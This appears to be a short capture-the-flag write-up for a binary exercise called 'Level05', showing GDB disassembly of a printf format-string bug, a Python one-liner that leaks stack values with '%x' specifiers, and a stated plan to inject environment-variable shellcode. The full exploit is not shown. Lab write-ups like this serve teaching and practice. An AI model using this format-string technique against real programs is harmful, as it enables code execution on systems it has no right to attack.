# Level05

First step - testing the program

    $ ./level05 
    coucou
    coucou

Write the input

Start in GDB

There is a `fgets()` call, stored the input on a buffer of 100 chars. A loop on the buffer for transform the input into lowercase.

At the end, there is a call to `printf()` with the buffer as parameter, this is a format string

    0x08048500 <+188>:	lea    eax,[esp+0x28]   ; buffer
    0x08048504 <+192>:	mov    DWORD PTR [esp],eax
    0x08048507 <+195>:	call   0x8048340 <printf@plt>

Let's try it

    $ python -c 'print "BBBB"+"-%x"*12' | ./level05 
    bbbb-64-f7fcfac0-f7ec3af9-ffffd5ff-ffffd5fe-0-ffffffff-ffffd684-f7fdb000-62626262-2d78252d-252d7825

The format string works and we can find our input at the 10th position

To exploit it, we can store a shellcode in an env variable and inject it at the 10th position with the format string